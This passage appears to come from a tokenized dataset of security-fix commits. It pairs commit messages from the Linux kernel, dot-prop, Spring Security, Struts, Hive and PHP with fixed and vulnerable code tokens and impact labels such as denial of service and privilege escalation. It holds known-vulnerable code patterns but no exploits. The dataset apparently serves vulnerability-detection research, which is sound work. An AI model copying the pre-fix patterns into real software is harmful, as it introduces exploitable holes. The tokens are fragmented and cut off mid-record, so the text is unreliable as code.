")", ";", "}", "else", "{", "error", "=", "-", "ENOENT", ";", "if", "(", "!", "dentry", "-", ">", "d_inode", ")", "goto", "out", ";", "filp", "=", "do_open", "(", "dentry", ",", "oflag", ")", ";", "}", "out", ":", "dput", "(", "dentry", ")", ";", "out_putfd", ":</s>struct", "file", "*", "filp", ";", "if", "(", "u_attr", "!", "=", "NULL", ")", "{", "return", "ERR_PTR", "(", "-", "EFAULT", ")", ";", "return", "ERR_PTR", "(", "-", "EINVAL", ")", ";", "return", "ERR_PTR", "(", "ret", ")", ";", "filp", "=", "dentry_open", "(", "dentry", ",", "mqueue_mnt", ",", "oflag", ")", ";", "if", "(", "!", "IS_ERR", "(", "filp", ")", ")", "dget", "(", "dentry", ")", ";", "return", "filp", ";", "struct", "file", "*", "filp", ";", "if", "(", "(", "oflag", "&", "O_ACCMODE", ")", "=", "=", "(", "O_RDWR", "|", "O_WRONLY", ")", ")", "if", "(", "permission", "(", "dentry", "-", ">", "d_inode", ",", "oflag2acc", "[", "oflag", "&", "O_ACCMODE", "]", ",", "NULL", ")", ")", "filp", "=", "dentry_open", "(", "dentry", ",", "mqueue_mnt", ",", "oflag", ")", ";", "if", "(", "!", "IS_ERR", "(", "filp", ")", ")", "dget", "(", "dentry", ")", ";", "return", "filp", ";", "filp", "=", "(", "oflag", "&", "O_EXCL", ")", "?", "ERR_PTR", "(", "-", "EEXIST", ")", ":", "do_open", "(", "dentry", ",", "oflag", ")", ";", "}", "else", "filp", "=", "(", "dentry", "-", ">", "d_inode", ")", "?", "do_open", "(", "dentry", ",", "oflag", ")", ":", "ERR_PTR", "(", "-", "ENOENT", ")", ";", "dput", "(", "dentry", ")", ";", "out_putfd", ":"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(panic", ")"]}
{"contents": ["ext4:", "Avoid", "printk", "floods", "in", "the", "face", "of", "directory", "corruption", "Note:", "some", "people", "thinks", "this", "represents", "a", "security", "bug,", "since", "it", "might", "make", "the", "system", "go", "away", "while", "it", "is", "printing", "a", "large", "number", "of", "console", "messages,", "especially", "if", "a", "serial", "console", "is", "involved.", "Hence,", "it", "has", "been", "assigned", ",", "but", "it", "requires", "that", "the", "attacker", "either", "has", "physical", "access", "to", "your", "machine", "to", "insert", "a", "USB", "disk", "with", "a", "corrupted", "filesystem", "image", "(at", "which", "point", "why", "not", "just", "hit", "the", "power", "button),", "or", "is", "otherwise", "able", "to", "convince", "the", "system", "administrator", "to", "mount", "an", "arbitrary", "filesystem", "image", "(at", "which", "point", "why", "not", "just", "include", "a", "setuid", "shell", "or", "world-writable", "hard", "disk", "device", "file", "or", "some", "such).", "Me,", "I", "think", "they're", "just", "being", "silly.", "--tytso", "Signed-off-by:", "Eric", "Sandeen", "<sandeen@redhat.com>", "Signed-off-by:", "\"Theodore", "Ts'o\"", "<tytso@mit.edu>", "Cc:", "linux-ext4@vger.kernel.org", "Cc:", "Eugene", "Teo", "<eugeneteo@kernel.sg>"], "code_tokens": ["int", "dir_has_error", "=", "0", ";", "if", "(", "!", "dir_has_error", ")", "{", "ext4_error", "(", "sb", ",", "__func__", ",", "\"", "directory", "#", "%", "lu", "\"", "\"", "contains", "a", "hole", "at", "offset", "%", "Lu", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", "long", ")", "filp", "-", ">", "f_pos", ")", ";", "dir_has_error", "=", "1", ";", "}</s>ext4_error", "(", "sb", ",", "\"", "ext4_readdir", "\"", ",", "\"", "directory", "#", "%", "lu", "contains", "a", "hole", "at", "offset", "%", "lu", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", ")", "filp", "-", ">", "f_pos", ")", ";"], "docstring_tokens": ["the", "system", "to", "hang", "resulting", "in", "a", "denial", "of", "service"]}
{"contents": ["Prevent", "setting/getting", "some", "problematic", "path", "components"], "code_tokens": ["const", "disallowedKeys", "=", "[", "'", "__proto__", "'", ",", "'", "prototype", "'", ",", "'", "constructor", "'", "]", ";", "const", "isValidPath", "=", "pathSegments", "=", ">", "!", "pathSegments", ".", "some", "(", "segment", "=", ">", "disallowedKeys", ".", "includes", "(", "segment", ")", ");", "if", "(", "!", "isValidPath", "(", "parts", ")", ")", "{", "return", "[", "];", "}", "if", "(", "pathArray", ".", "length", "=", "==", "0", ")", "{", "return", ";", "}", "if", "(", "pathArray", ".", "length", "=", "==", "0", ")", "{", "return", "false", ";", "}", "The", "following", "path", "components", "are", "invalid", "and", "results", "in", "`", "undefined", "`", "being", "returned", ":", "`", "__proto__", "`", ",", "`", "prototype", "`", ",", "`", "constructor", "`", ".", "test", "(", "'", "prevent", "setting", "/", "getting", "`", "__proto__", "`", "',", "t", "=", ">", "{", "dotProp", ".", "set", "(", "{}", ",", "'", "__proto__", ".", "unicorn", "'", ",", "'", "\ud83e\udd84'", ");", "t", ".", "not", "(", "{}", ".", "unicorn", ",", "'", "\ud83e\udd84'", ");", "/", "/", "eslint", "-", "disable", "-", "line", "no", "-", "use", "-", "extend", "-", "native", "/", "no", "-", "use", "-", "extend", "-", "native", "t", ".", "is", "(", "dotProp", ".", "get", "(", "{}", ",", "'", "__proto__", "'", "),", "undefined", ")", ";", "}", ");</s>"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "a", "denial", "of", "service"]}
{"contents": ["check", "privileges", "before", "setting", "mount", "propagation", "There's", "a", "missing", "check", "for", "CAP_SYS_ADMIN", "in", "do_change_type().", "Signed-off-by:", "Miklos", "Szeredi", "<mszeredi@suse.cz>", "Cc:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Cc:", "Christoph", "Hellwig", "<hch@lst.de>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "!", "capable", "(", "CAP_SYS_ADMIN", ")", ")", "return", "-", "EPERM", ";</s>"], "docstring_tokens": ["gain", "elevated", "privileges", "or", "cause", "a", "denial", "of", "service"]}
{"contents": ["KEYS:", "ensure", "we", "free", "the", "assoc", "array", "edit", "if", "edit", "is", "valid", "__key_link_end", "is", "not", "freeing", "the", "associated", "array", "edit", "structure", "and", "this", "leads", "to", "a", "512", "byte", "memory", "leak", "each", "time", "an", "identical", "existing", "key", "is", "added", "with", "add_key().", "The", "reason", "the", "add_key()", "system", "call", "returns", "okay", "is", "that", "key_create_or_update()", "calls", "__key_link_begin()", "before", "checking", "to", "see", "whether", "it", "can", "update", "a", "key", "directly", "rather", "than", "adding/replacing", "-", "which", "it", "turns", "out", "it", "can.", "Thus", "__key_link()", "is", "not", "called", "through", "__key_instantiate_and_link()", "and", "__key_link_end()", "must", "cancel", "the", "edit.", "Signed-off-by:", "Colin", "Ian", "King", "<colin.king@canonical.com>", "Signed-off-by:", "David", "Howells", "<dhowells@redhat.com>", "Signed-off-by:", "James", "Morris", "<james.l.morris@oracle.com>"], "code_tokens": ["if", "(", "edit", ")", "{", "if", "(", "!", "edit", "-", ">", "dead_leaf", ")", "{", "key_payload_reserve", "(", "keyring", ",", "keyring", "-", ">", "datalen", "-", "KEYQUOTA_LINK_BYTES", ")", ";", "}</s>if", "(", "edit", "&", "&", "!", "edit", "-", ">", "dead_leaf", ")", "{", "key_payload_reserve", "(", "keyring", ",", "keyring", "-", ">", "datalen", "-", "KEYQUOTA_LINK_BYTES", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(memory", "consumption", ")"]}
{"contents": ["Fix", "bug", "#67328", "(fileinfo:", "numerous", "file_printf", "calls", "resulting", "in", "performance", "degradation)", "Upstream", "patch:", "https://github.com/file/file/commit/b8acc83781d5a24cc5101e525d15efe0482c280d"], "code_tokens": [".", "Fixed", "bug", "#", "67328", "(", "fileinfo", ":", "fileinfo", ":", "numerous", "file_printf", "calls", "resulting", "in", "performance", "degradation", ")", ".", "size_t", "maxcount", ";", "ssi", "-", ">", "si_count", "=", "CDF_TOLE4", "(", "si", "-", ">", "si_count", ")", ";", "if", "(", "cdf_read_property_info", "(", "sst", ",", "h", ",", "CDF_TOLE4", "(", "sd", "-", ">", "sd_offset", ")", ",", "info", ",", "count", ",", "&", "maxcount", ")", "=", "=", "-", "1", ")</s>-", "Fileinfo", ":", "(", "CVE", "-", "2014", "-", "0238", ")", ".", "-", "FPM", ":", "size_t", "i", ",", "maxcount", ";", "ssi", "-", ">", "si_count", "=", "CDF_TOLE2", "(", "si", "-", ">", "si_count", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "CDF_TOLE4", "(", "si", "-", ">", "si_count", ")", ";", "i", "+", "+)", "{", "if", "(", "i", ">", "=", "CDF_LOOP_LIMIT", ")", "{", "DPRINTF", "(", "(\"", "Unpack", "summary", "info", "loop", "limit", "\"", "))", ";", "errno", "=", "EFTYPE", ";", "return", "-", "1", ";", "}", "if", "(", "cdf_read_property_info", "(", "sst", ",", "h", ",", "CDF_TOLE4", "(", "sd", "-", ">", "sd_offset", ")", ",", "info", ",", "count", ",", "&", "maxcount", ")", "=", "=", "-", "1", ")", "{", "}", "}"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(performance", "degradation", ")"]}
{"contents": ["Avoids", "parsing", "namespace", "when", "using", "existing", "namespace"], "code_tokens": ["String", "finalNamespace", "=", "this", ".", "namespace", "!", "=", "null", "?", "TextParseUtil", ".", "translateVariables", "(", "namespace", ",", "stack", ")", ":", "invocation", ".", "getProxy", "(", ").", "getNamespace", "(", ");", "parseLocation", "=", "false", ";", "parseLocation", "=", "false", ";", "protected", "boolean", "parseLocation", "=", "true", ";", "lastFinalLocation", "=", "parseLocation", "?", "conditionalParse", "(", "location", ",", "invocation", ")", ":", "location", ";", "parseLocation", "=", "false", ";</s>/", "/", "if", "the", "finalNamespace", "wasn", "'", "t", "explicitly", "defined", ",", "assume", "the", "current", "one", "if", "(", "this", ".", "namespace", "=", "=", "null", ")", "{", "this", ".", "namespace", "=", "invocation", ".", "getProxy", "(", ").", "getNamespace", "(", ");", "}", "String", "finalNamespace", "=", "TextParseUtil", ".", "translateVariables", "(", "namespace", ",", "stack", ")", ";", "lastFinalLocation", "=", "conditionalParse", "(", "location", ",", "invocation", ")", ";"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["bridge:", "fix", "mdb", "info", "leaks", "The", "bridging", "code", "discloses", "heap", "and", "stack", "bytes", "via", "the", "RTM_GETMDB", "netlink", "interface", "and", "via", "the", "notify", "messages", "send", "to", "group", "RTNLGRP_MDB", "afer", "a", "successful", "add/del.", "Fix", "both", "cases", "by", "initializing", "all", "unset", "members/padding", "bytes", "with", "memset(0).", "Cc:", "Stephen", "Hemminger", "<stephen@networkplumber.org>", "Signed-off-by:", "Mathias", "Krause", "<minipli@googlemail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["memset", "(", "&", "e", ",", "0", ",", "sizeof", "(", "e", ")", ");", "memset", "(", "bpm", ",", "0", ",", "sizeof", "(", "*", "bpm", ")", ");", "memset", "(", "bpm", ",", "0", ",", "sizeof", "(", "*", "bpm", ")", ");", "memset", "(", "&", "entry", ",", "0", ",", "sizeof", "(", "entry", ")", ");</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "memory"]}
{"contents": ["Bluetooth:", "Fix", "potential", "NULL", "dereference", "in", "RFCOMM", "bind", "callback", "addr", "can", "be", "NULL", "and", "it", "should", "not", "be", "dereferenced", "before", "NULL", "checking.", "Signed-off-by:", "Jaganath", "Kanakkassery", "<jaganath.k@samsung.com>", "Signed-off-by:", "Marcel", "Holtmann", "<marcel@holtmann.org>"], "code_tokens": ["struct", "sockaddr_rc", "sa", ";", "int", "len", ",", "err", "=", "0", ";", "memset", "(", "&", "sa", ",", "0", ",", "sizeof", "(", "sa", ")", ");", "len", "=", "min_t", "(", "unsigned", "int", ",", "sizeof", "(", "sa", ")", ",", "addr_len", ")", ";", "memcpy", "(", "&", "sa", ",", "addr", ",", "len", ")", ";", "BT_DBG", "(", "\"", "sk", "%", "p", "%", "pMR", "\"", ",", "sk", ",", "&", "sa", ".", "rc_bdaddr", ")", ";", "if", "(", "sa", ".", "rc_channel", "&", "&", "__rfcomm_get_listen_sock_by_addr", "(", "sa", ".", "rc_channel", ",", "&", "sa", ".", "rc_bdaddr", ")", ")", "{", "bacpy", "(", "&", "rfcomm_pi", "(", "sk", ")", "->", "src", ",", "&", "sa", ".", "rc_bdaddr", ")", ";", "rfcomm_pi", "(", "sk", ")", "->", "channel", "=", "sa", ".", "rc_channel", ";</s>struct", "sockaddr_rc", "*", "sa", "=", "(", "struct", "sockaddr_rc", "*", ")", "addr", ";", "int", "chan", "=", "sa", "-", ">", "rc_channel", ";", "int", "err", "=", "0", ";", "BT_DBG", "(", "\"", "sk", "%", "p", "%", "pMR", "\"", ",", "sk", ",", "&", "sa", "-", ">", "rc_bdaddr", ")", ";", "if", "(", "chan", "&", "&", "__rfcomm_get_listen_sock_by_addr", "(", "chan", ",", "&", "sa", "-", ">", "rc_bdaddr", ")", ")", "{", "bacpy", "(", "&", "rfcomm_pi", "(", "sk", ")", "->", "src", ",", "&", "sa", "-", ">", "rc_bdaddr", ")", ";", "rfcomm_pi", "(", "sk", ")", "->", "channel", "=", "chan", ";"], "docstring_tokens": ["obtain", "sensitive", "information", "or", "cause", "a", "denial", "of", "service", "on", "the", "system"]}
{"contents": ["SEC-2500:", "Prevent", "anonymous", "bind", "for", "ActiveDirectoryLdapAuthenticator"], "code_tokens": ["AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Empty", "Password", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "\\", "u0160patn", "\\", "u00E9", "p", "\\", "u0159ihla", "\\", "u0161ovac", "\\", "u00ED", "\\", "u00FAdaje", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Ung", "\\", "u00FCltige", "Benutzerberechtigungen", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Credenciales", "err", "\\", "u00F3neas", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Le", "mot", "de", "passe", "est", "obligatoire", "AbstractLdapAuthenticationProvider", ".", "badCredentials", "=", "Credenziali", "non", "valide", "AbstractLdapAuthenticationProvider", ".", "badCredentials", "=", "\\", "uBE44", "\\", "uBC00", "\\", "uBC88", "\\", "uD638", "\\", "uAC00", "\\", "uB9DE", "\\", "uC9C0", "\\", "uC54A", "\\", "uC2B5", "\\", "uB2C8", "\\", "uB2E4", ".", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Tu", "\\", "u0161", "\\", "u010dias", "slapta", "\\", "u017eodis", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Niepoprawne", "dane", "uwierzytelniaj", "\\", "u0105ce", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Usu", "\\", "u00E1rio", "inexistente", "ou", "senha", "inv", "\\", "u00E1lida", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "Credenciais", "inv", "\\", "u00E1lidas", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "\\", "u0414", "\\", "u0430", "\\", "u043D", "\\", "u0456", "\\", "u043A", "\\", "u043E", "\\", "u0440", "\\", "u0438", "\\", "u0441", "\\", "u0442", "\\", "u0443", "\\", "u0432", "\\", "u0430", "\\", "u0447", "\\", "u0430", "\\", "u043D", "\\", "u0435", "\\", "u043A", "\\", "u043E", "\\", "u0440", "\\", "u0435", "\\", "u043A", "\\", "u0442", "\\", "u043D", "\\", "u0456", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "=", "\\", "u574F", "\\", "u7684", "\\", "u51ED", "\\", "u8BC1", "/", "*", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "security", ".", "ldap", ".", "authentication", ";", "if", "(", "!", "StringUtils", ".", "hasLength", "(", "password", ")", ")", "{", "throw", "new", "BadCredentialsException", "(", "messages", ".", "getMessage", "(", "\"", "AbstractLdapAuthenticationProvider", ".", "emptyPassword", "\"", ",", "\"", "Empty", "Password", "\"", "))", ";", "}", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "/", "/", "SEC", "-", "2500", "@", "Test", "(", "expected", "=", "BadCredentialsException", ".", "class", ")", "public", "void", "sec2500PreventAnonymousBind", "(", ")", "{", "provider", ".", "authenticate", "(", "new", "UsernamePasswordAuthenticationToken", "(", "\"", "rwinch", "\"", ",", "\"", "\")", ");", "}</s>package", "org", ".", "springframework", ".", "security", ".", "ldap", ".", "authentication", ";", "*", "Copyright", "2002", "-", "2012", "the", "original", "author", "or", "authors", "."], "docstring_tokens": ["bypass", "password", "validation"]}
{"contents": ["[PATCH]", "remote", "memory", "corruptor", "in", "ibmtr.c", "ip_summed", "changes", "last", "summer", "had", "missed", "that", "one.", "As", "the", "result,", "we", "have", "ip_summed", "interpreted", "as", "CHECKSUM_PARTIAL", "now.", "IOW,", "->csum", "is", "interpreted", "as", "offset", "of", "checksum", "in", "the", "packet.", "net/core/*", "will", "both", "read", "and", "modify", "the", "value", "as", "that", "offset,", "with", "obvious", "reasons.", "At", "the", "very", "least", "it's", "a", "remote", "memory", "corruptor.", "Signed-off-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["skb", "-", ">", "ip_summed", "=", "CHECKSUM_COMPLETE", ";</s>skb", "-", ">", "ip_summed", "=", "1", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(memory", "corruption", ")"]}
{"contents": ["HIVE-9941:", "sql", "std", "authorization", "on", "partitioned", "table:", "truncate", "and", "insert", "(Sushanth", "Sowmyan", "via", "Jason", "Dere)"], "code_tokens": ["set", "hive", ".", "test", ".", "authz", ".", "sstd", ".", "hs2", ".", "mode", "=", "true", ";", "set", "hive", ".", "security", ".", "authorization", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "authorization", ".", "plugin", ".", "sqlstd", ".", "SQLStdHiveAuthorizerFactoryForTest", ";", "set", "hive", ".", "security", ".", "authenticator", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "SessionStateConfigUserAuthenticator", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "true", ";", "-", "-", "check", "alter", "-", "drop", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", ";", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", ";", "set", "user", ".", "name", "=", "user1", ";", "alter", "table", "auth_trunc2", "drop", "partition", "(", "j", "=", "42", ")", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "19", "@", "@", "set", "hive", ".", "test", ".", "authz", ".", "sstd", ".", "hs2", ".", "mode", "=", "true", ";", "set", "hive", ".", "security", ".", "authorization", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "authorization", ".", "plugin", ".", "sqlstd", ".", "SQLStdHiveAuthorizerFactoryForTest", ";", "set", "hive", ".", "security", ".", "authenticator", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "SessionStateConfigUserAuthenticator", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "true", ";", "dfs", "$", "{", "system", ":", "test", ".", "dfs", ".", "mkdir", "}", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "export", "/", "temp", ";", "dfs", "-", "rmr", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "export", ";", "dfs", "$", "{", "system", ":", "test", ".", "dfs", ".", "mkdir", "}", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "export", "/", ";", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_export_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", ";", "alter", "table", "auth_export_ptn", "add", "partition", "(", "j", "=", "42", ")", ";", "set", "user", ".", "name", "=", "user1", ";", "export", "table", "auth_export_ptn", "partition", "(", "j", "=", "42", ")", "to", "'", "pfile", ":", "//", "${", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "export", "'", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "false", ";", "drop", "table", "auth_export_ptn", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "23", "@", "@", "set", "hive", ".", "test", ".", "authz", ".", "sstd", ".", "hs2", ".", "mode", "=", "true", ";", "set", "hive", ".", "security", ".", "authorization", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "authorization", ".", "plugin", ".", "sqlstd", ".", "SQLStdHiveAuthorizerFactoryForTest", ";", "set", "hive", ".", "security", ".", "authenticator", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "SessionStateConfigUserAuthenticator", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "true", ";", "dfs", "$", "{", "system", ":", "test", ".", "dfs", ".", "mkdir", "}", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "import", "/", "temp", ";", "dfs", "-", "rmr", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "import", ";", "dfs", "$", "{", "system", ":", "test", ".", "dfs", ".", "mkdir", "}", "$", "{", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "import", "/", ";", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_import_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", ";", "alter", "table", "auth_import_ptn", "add", "partition", "(", "j", "=", "42", ")", ";", "export", "table", "auth_import_ptn", "partition", "(", "j", "=", "42", ")", "to", "'", "pfile", ":", "//", "${", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "import", "'", ";", "alter", "table", "auth_import_ptn", "drop", "partition", "(", "j", "=", "42", ")", ";", "set", "user", ".", "name", "=", "user1", ";", "import", "table", "auth_import_ptn", "partition", "(", "j", "=", "42", ")", "from", "'", "pfile", ":", "//", "${", "system", ":", "test", ".", "tmp", ".", "dir", "}", "/", "hive", "-", "12875", "-", "import", "'", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "false", ";", "drop", "table", "auth_import_ptn", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "11", "@", "@", "set", "hive", ".", "test", ".", "authz", ".", "sstd", ".", "hs2", ".", "mode", "=", "true", ";", "set", "hive", ".", "security", ".", "authorization", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "authorization", ".", "plugin", ".", "sqlstd", ".", "SQLStdHiveAuthorizerFactoryForTest", ";", "set", "hive", ".", "security", ".", "authenticator", ".", "manager", "=", "org", ".", "apache", ".", "hadoop", ".", "hive", ".", "ql", ".", "security", ".", "SessionStateConfigUserAuthenticator", ";", "set", "hive", ".", "security", ".", "authorization", ".", "enabled", "=", "true", ";", "-", "-", "check", "truncate", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", ";", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", ";", "set", "user", ".", "name", "=", "user1", ";", "truncate", "table", "auth_trunc2", "partition", "(", "j", "=", "42", ")", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "18", "@", "@", "PREHOOK", ":", "query", ":", "-", "-", "check", "alter", "-", "drop", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "PREHOOK", ":", "type", ":", "CREATETABLE", "PREHOOK", ":", "Output", ":", "database", ":", "default", "PREHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "query", ":", "-", "-", "check", "alter", "-", "drop", "on", "partition", "create", "table", "auth_trunc2", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "POSTHOOK", ":", "type", ":", "CREATETABLE", "POSTHOOK", ":", "Output", ":", "database", ":", "default", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "PREHOOK", ":", "query", ":", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", "PREHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "PREHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "query", ":", "alter", "table", "auth_trunc2", "add", "partition", "(", "j", "=", "42", ")", "POSTHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_trunc2", "@", "j", "=", "42", "FAILED", ":", "HiveAccessControlException", "Permission", "denied", ":", "Principal", "[", "name", "=", "user1", ",", "type", "=", "USER", "]", "does", "not", "have", "following", "privileges", "for", "operation", "ALTERTABLE_DROPPARTS", "[", "[", "DELETE", "]", "on", "Object", "[", "type", "=", "TABLE_OR_VIEW", ",", "name", "=", "default", ".", "auth_trunc2", "]", "]", "@", "@", "-", "0", ",", "0", "+", "1", ",", "19", "@", "@", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "PREHOOK", ":", "query", ":", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_export_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "PREHOOK", ":", "type", ":", "CREATETABLE", "PREHOOK", ":", "Output", ":", "database", ":", "default", "PREHOOK", ":", "Output", ":", "default", "@", "auth_export_ptn", "POSTHOOK", ":", "query", ":", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_export_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "POSTHOOK", ":", "type", ":", "CREATETABLE", "POSTHOOK", ":", "Output", ":", "database", ":", "default", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_export_ptn", "PREHOOK", ":", "query", ":", "alter", "table", "auth_export_ptn", "add", "partition", "(", "j", "=", "42", ")", "PREHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "PREHOOK", ":", "Output", ":", "default", "@", "auth_export_ptn", "POSTHOOK", ":", "query", ":", "alter", "table", "auth_export_ptn", "add", "partition", "(", "j", "=", "42", ")", "POSTHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_export_ptn", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_export_ptn", "@", "j", "=", "42", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "@", "@", "-", "0", ",", "0", "+", "1", ",", "34", "@", "@", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "PREHOOK", ":", "query", ":", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_import_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "PREHOOK", ":", "type", ":", "CREATETABLE", "PREHOOK", ":", "Output", ":", "database", ":", "default", "PREHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "POSTHOOK", ":", "query", ":", "-", "-", "check", "export", "on", "partition", "create", "table", "auth_import_ptn", "(", "i", "int", ")", "partitioned", "by", "(", "j", "int", ")", "POSTHOOK", ":", "type", ":", "CREATETABLE", "POSTHOOK", ":", "Output", ":", "database", ":", "default", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "PREHOOK", ":", "query", ":", "alter", "table", "auth_import_ptn", "add", "partition", "(", "j", "=", "42", ")", "PREHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "PREHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "POSTHOOK", ":", "query", ":", "alter", "table", "auth_import_ptn", "add", "partition", "(", "j", "=", "42", ")", "POSTHOOK", ":", "type", ":", "ALTERTABLE_ADDPARTS", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "POSTHOOK", ":", "Output", ":", "default", "@", "auth_import_ptn", "@", "j", "=", "42", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "PREHOOK", ":", "type", ":", "EXPORT", "PREHOOK", ":", "Input", ":", "default", "@", "auth_import_ptn", "@", "j", "=", "42", "#", "##", "#", "A", "masked", "pattern", "was", "here", "#", "##", "#", "POSTHOOK", ":", "type", ":", "EXPORT", "POSTHOOK", ":", "Input", ":", "default", "@", 